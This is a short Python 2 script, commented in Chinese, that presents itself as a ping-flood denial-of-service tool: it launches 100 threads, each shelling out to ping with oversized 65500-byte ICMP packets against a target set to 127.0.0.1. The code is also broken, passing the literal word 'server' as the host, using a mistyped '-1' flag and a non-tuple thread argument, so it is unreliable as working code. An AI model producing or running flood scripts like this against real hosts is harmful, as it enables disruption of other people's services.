import subprocess, thread, time


"""ping命令使用ICMP协议，ping最大65500字节可以实现DoS攻击"""
server = "127.0.0.1"
def dos(id):
	#  创建ping进程
	ret = subprocess.call("ping server -1 65500", shell = True)
	print(id)

for i in range(100):
	thread.start_new_thread(dos, (i))
time.sleep(1)
